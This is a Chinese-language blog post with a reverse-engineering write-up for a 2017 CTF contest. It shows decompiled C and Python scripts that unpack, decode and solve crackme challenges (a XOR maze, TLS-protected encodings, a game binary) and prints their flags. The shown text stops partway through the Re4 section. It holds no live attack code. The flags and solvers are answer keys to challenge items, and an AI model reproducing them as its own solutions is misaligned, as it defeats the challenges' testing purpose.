<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/ESE.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/ESE1.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="wking's Note" type="application/atom+xml" />






<meta name="description" content="这次比赛，有点坑逆向选手，再次感谢各位宽容大方善良美丽可爱小伙伴们。。。。">
<meta property="og:type" content="article">
<meta property="og:title" content="悄悄的wp">
<meta property="og:url" content="http://yoursite.com/2017/12/11/2017_12_11_zjgsctf_re_wp/index.html">
<meta property="og:site_name" content="wking&#39;s Note">
<meta property="og:description" content="这次比赛，有点坑逆向选手，再次感谢各位宽容大方善良美丽可爱小伙伴们。。。。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.imgur.com/52gZ58m.png">
<meta property="og:image" content="https://i.imgur.com/WyLpecF.png">
<meta property="og:image" content="https://i.imgur.com/3xoBk7P.png">
<meta property="og:image" content="https://i.imgur.com/McHlAzO.png">
<meta property="og:updated_time" content="2018-03-26T12:38:29.333Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="悄悄的wp">
<meta name="twitter:description" content="这次比赛，有点坑逆向选手，再次感谢各位宽容大方善良美丽可爱小伙伴们。。。。">
<meta name="twitter:image" content="https://i.imgur.com/52gZ58m.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2017/12/11/2017_12_11_zjgsctf_re_wp/"/>





  <title>悄悄的wp | wking's Note</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">wking's Note</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">阅览室</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/11/2017_12_11_zjgsctf_re_wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wking's Note">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">悄悄的wp</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-11T16:10:07+08:00">
                2017-12-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          
          作者：ESE

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>这次比赛，有点坑逆向选手，再次感谢各位宽容大方善良美丽可爱小伙伴们。。。。<br><a id="more"></a></p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h2><p>用peid查壳，发现是upx加壳，直接脱壳（ESP定律或者直接找脱壳工具），用IAD打开<br>发现关键函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">__<span class="function">int64 <span class="title">main_0</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> v0; <span class="comment">// edx</span></div><div class="line">  __int64 v1; <span class="comment">// ST00_8</span></div><div class="line">  <span class="keyword">char</span> Buffer; <span class="comment">// [esp+D0h] [ebp-3Ch]</span></div><div class="line"></div><div class="line">  <span class="built_in">puts</span>(<span class="string">"input your Secret:"</span>);</div><div class="line">  gets(&amp;Buffer);</div><div class="line">  <span class="keyword">if</span> ( sub_4110E6((<span class="keyword">int</span>)&amp;unk_417680, &amp;Buffer) )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( sub_41102D(&amp;unk_417680) )</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"flag is flag&#123;%s&#125;\n"</span>, &amp;Buffer);</div><div class="line">    <span class="keyword">else</span></div><div class="line">      <span class="built_in">printf</span>(<span class="string">"you can do it,again\n"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"sorry\n"</span>);</div><div class="line">  &#125;</div><div class="line">  HIDWORD(v1) = v0;</div><div class="line">  LODWORD(v1) = <span class="number">0</span>;</div><div class="line">  <span class="keyword">return</span> v1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>发现sub_4110E6功能如下（简单xor），发现key<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411520</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *Str)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+DCh] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> ( j_strlen(Str) != <span class="number">28</span> )</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i )</div><div class="line">    *(_BYTE *)(i + a1) = LOBYTE(dword_417000[i]) ^ Str[i];</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>发现sub_41102D函数，如果做过类似题的话，知道这是一个迷宫题目，因为发现正好是上下左右，并且一步都会判断是否出错，因为是+16，判断为宽16<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_4115D0</span><span class="params">(<span class="keyword">int</span> a1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+D0h] [ebp-20h]</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  v2 = <span class="string">'&#125;'</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">switch</span> ( *(_BYTE *)(i + a1) )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">case</span> <span class="string">'l'</span>:</div><div class="line">        --v2;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'r'</span>:</div><div class="line">        ++v2;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'f'</span>:</div><div class="line">        v2 += <span class="number">16</span>;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">        v2 -= <span class="number">16</span>;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( byte_417070[v2] == <span class="string">'d'</span> )</div><div class="line">      <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> ( byte_417070[v2] != <span class="string">'1'</span> )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>OD加载，发现迷宫，s是开始 ，d是结束，每一步都是1（否则失败），l向左，r向右，f向下，b向上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0000000000000000</div><div class="line">0   1111111111 0</div><div class="line">0   1        1 0</div><div class="line">0   1        11d</div><div class="line">0   1          0</div><div class="line">0   1111111111 0</div><div class="line">0            1 0</div><div class="line">0000000000000s00</div><div class="line">``</div><div class="line">得到字符串`bblllllllllbbbbrrrrrrrrrffrr`，用python写xor代码得</div><div class="line">``` C</div><div class="line">def Re1_qimo():</div><div class="line">    c = []</div><div class="line">    str = &apos;bblllllllllbbbbrrrrrrrrrffrr&apos;</div><div class="line">    key = [0x2B,0x16,0x33,0x05,0x1F,0x33,0x19,0x1C,0x14,0x33,0x0D,0x0C,0x06,0x3D,0x0F,0x13,0x02,0x2D,0x0B,0x1D,0x07,0x2D,0x19,0x1C,0x56,0x11,0x53,0x53]</div><div class="line">    for i in range(28):</div><div class="line">        c.append(chr(ord(str[i])^key[i]))</div><div class="line">    print &quot;&quot;.join(c)</div></pre></td></tr></table></figure></p>
<p>flag: It_is_upx_and_map_you_kn0w!!</p>
<h2 id="Re3"><a href="#Re3" class="headerlink" title="Re3"></a>Re3</h2><p>有ida打开，发现tls,脱去TLS可以参考<a href="https://esebanana.github.io/2017/10/10/re_tls/" target="_blank" rel="external">https://esebanana.github.io/2017/10/10/re_tls/</a><br>发现第一个加密用户名函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_412530</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> k; <span class="comment">// [esp+D0h] [ebp-54h]</span></div><div class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+DCh] [ebp-48h]</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-3Ch]</span></div><div class="line">  __int16 v4[<span class="number">14</span>]; <span class="comment">// [esp+F4h] [ebp-30h]</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+118h] [ebp-Ch]</span></div><div class="line"></div><div class="line">  v5 = j_strlen(&amp;Str);</div><div class="line">  v4[<span class="number">0</span>] = <span class="number">96</span>;</div><div class="line">  v4[<span class="number">1</span>] = <span class="number">113</span>;</div><div class="line">  v4[<span class="number">2</span>] = <span class="number">96</span>;</div><div class="line">  v4[<span class="number">3</span>] = <span class="number">111</span>;</div><div class="line">  v4[<span class="number">4</span>] = <span class="number">127</span>;</div><div class="line">  v4[<span class="number">5</span>] = <span class="number">105</span>;</div><div class="line">  v4[<span class="number">6</span>] = <span class="number">75</span>;</div><div class="line">  v4[<span class="number">7</span>] = <span class="number">85</span>;</div><div class="line">  v4[<span class="number">8</span>] = <span class="number">115</span>;</div><div class="line">  v4[<span class="number">9</span>] = <span class="number">122</span>;</div><div class="line">  v4[<span class="number">10</span>] = <span class="number">74</span>;</div><div class="line">  v4[<span class="number">11</span>] = <span class="number">83</span>;</div><div class="line">  v4[<span class="number">12</span>] = <span class="number">64</span>;</div><div class="line">  v4[<span class="number">13</span>] = <span class="number">81</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 / <span class="number">2</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(&amp;Str + i) ^= *(&amp;Str + v5 - <span class="number">1</span> - i);</div><div class="line">    *(&amp;Str + v5 - <span class="number">1</span> - i) ^= *(&amp;Str + i);</div><div class="line">    *(&amp;Str + i) ^= *(&amp;Str + v5 - <span class="number">1</span> - i);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v5; ++j )</div><div class="line">    word_419500[j] = (<span class="keyword">unsigned</span> __int8)(((((j ^ <span class="number">0x76</span>) - <span class="number">18</span>) ^ <span class="number">0x80</span>) + <span class="number">43</span>) ^ *(&amp;Str + j));</div><div class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v5; ++k )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( word_419500[k] != v4[k] )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>解密代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def Re3_qimo():</div><div class="line">    c = []</div><div class="line">    key = [<span class="number">96</span>,<span class="number">113</span>,<span class="number">96</span>,<span class="number">111</span>,<span class="number">127</span>,<span class="number">105</span>,<span class="number">75</span>,<span class="number">85</span>,<span class="number">115</span>,<span class="number">122</span>,<span class="number">74</span>,<span class="number">83</span>,<span class="number">64</span>,<span class="number">81</span>]</div><div class="line">    l=len(key)</div><div class="line">    <span class="keyword">for</span> i in range(l):</div><div class="line">        c.append(chr(key[i]^((((i ^ <span class="number">0x76</span>) - <span class="number">18</span>) ^ <span class="number">0x80</span>) + <span class="number">43</span>)%<span class="number">256</span>))</div><div class="line">    c.reverse()</div><div class="line">    print <span class="string">""</span>.join(c)</div></pre></td></tr></table></figure></p>
<p>输入flag后、判断flag长度35位，<br>加密一、flag异或得到flag1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">int __cdecl sub_411730(int a1, int a2)</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line">  signed int i; // [esp+D0h] [ebp-8h]</div><div class="line"></div><div class="line">  for ( i = 0; i &lt; 35; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2) ^ 0x76;</div><div class="line">    result = i + 1;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>然后将flag1将中间21个字符分为3组，每一组分别加密<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">#第一组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411800</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">7</span>) ^ <span class="number">0xCC</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">2</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xAA</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xAA</span>) &gt;&gt; <span class="number">1</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line">#第二组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411910</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">14</span>) ^ <span class="number">0xBE</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">4</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xCC</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xCC</span>) &gt;&gt; <span class="number">2</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line">#第三组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411A30</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">21</span>) ^ <span class="number">0xEF</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">16</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xF0</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最后和key1比较<br>key1 = [0x10,0x1a ,0x17 ,0x11 ,0xd,0x22 ,0x1e ,0xe3 ,0xc6 ,0xda ,0xe3 ,0xc6 ,0xda ,0xdd ,0xf6 ,0xee ,0x6d ,0xe4 ,0xad ,0xe7 ,0x6d ,0xdf ,0x6f ,0x7f ,0x9a ,0xde ,0x6c ,0xff ,0x13 ,0x17 ,0x4 ,0x29 ,0x57 ,0x57 ,0xb ]</p>
<p>解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">def Re3_qimo():</div><div class="line">    c = []</div><div class="line">    key = [96,113,96,111,127,105,75,85,115,122,74,83,64,81]</div><div class="line">    l=len(key)</div><div class="line">    for i in range(l):</div><div class="line">        c.append(chr(key[i]^((((i ^ 0x76) - 18) ^ 0x80) + 43)%256))</div><div class="line">    c.reverse()</div><div class="line">    print &quot;&quot;.join(c)</div><div class="line"></div><div class="line">    enc_t = [0x10,0x1a ,0x17 ,0x11 ,0xd,0x22 ,0x1e ,0xe3 ,0xc6 ,0xda ,0xe3 ,0xc6 ,0xda ,0xdd ,0xf6 ,0xee ,0x6d ,0xe4 ,0xad ,0xe7 ,0x6d ,0xdf ,0x6f ,0x7f ,0x9a ,0xde ,0x6c ,0xff ,0x13 ,0x17 ,0x4 ,0x29 ,0x57 ,0x57 ,0xb ]</div><div class="line"></div><div class="line">    dec_t = [0]*35</div><div class="line">    #decode1</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+7] &amp; 0x55) &lt;&lt; 1</div><div class="line">        v2 = (enc_t[i+7] &gt;&gt; 1) &amp; 0x55</div><div class="line">        enc_t[i+7] = v1 | v2</div><div class="line">        enc_t[i+7] = enc_t[i+7] ^ 0xCC</div><div class="line">    #decode2</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+14] &amp; 0x33) &lt;&lt; 2</div><div class="line">        v2 = (enc_t[i+14] &gt;&gt; 2) &amp; 0x33</div><div class="line">        enc_t[i+14] = v1 | v2</div><div class="line">        enc_t[i+14] = enc_t[i+14] ^ 0xBE</div><div class="line">    #decode3</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+21] &amp; 0xF) &lt;&lt; 4</div><div class="line">        v2 = (enc_t[i+21] &gt;&gt; 4) &amp; 0xF</div><div class="line">        enc_t[i+21] = v1 | v2</div><div class="line">        enc_t[i+21] = enc_t[i+21] ^ 0xEF</div><div class="line"></div><div class="line">    for i in range(35):</div><div class="line">        dec_t[i] = chr(enc_t[i] ^ 0x76)</div><div class="line"></div><div class="line">    print &quot;&quot;.join(dec_t)</div></pre></td></tr></table></figure></p>
<h2 id="Re4"><a href="#Re4" class="headerlink" title="Re4"></a>Re4</h2><p>IDA打开找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">int __thiscall muen_412200(void *this)</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line">  void *v2; // ecx</div><div class="line">  void *v3; // ecx</div><div class="line">  void *v4; // ecx</div><div class="line"></div><div class="line">  LOBYTE(result) = sub_411163(this);</div><div class="line">  dword_4182DC = (char)result;</div><div class="line">  result = (char)result;</div><div class="line">  switch ( (char)result )</div><div class="line">  &#123;</div><div class="line">    case 0:</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v2);</div><div class="line">      break;</div><div class="line">    case 1:</div><div class="line">      j_atk_subkkkkkkkkkkkkkkkkkkkkkk_412010();</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v3);</div><div class="line">      break;</div><div class="line">    case 2:</div><div class="line">      deffffffffffffffffffffff_41111D();</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v4);</div><div class="line">      break;</div><div class="line">    case 3:</div><div class="line">      deah_411113();</div><div class="line">      return result;</div><div class="line">    default:</div><div class="line">      return result;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>找到攻击函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">int sub_412010()</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line"></div><div class="line">  if ( hp &gt; 0 )</div><div class="line">  &#123;</div><div class="line">    hp -= boss_atk;</div><div class="line">    result = boss_hp - atk;</div><div class="line">    boss_hp -= atk;</div><div class="line">  &#125;</div><div class="line">  if ( hp &lt;= 0 )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;you are die!!\n&quot;);</div><div class="line">    exit(0);</div><div class="line">  &#125;</div><div class="line">  if ( boss_hp &lt;= 0 )</div><div class="line">    result = sub_41100F();</div><div class="line"> 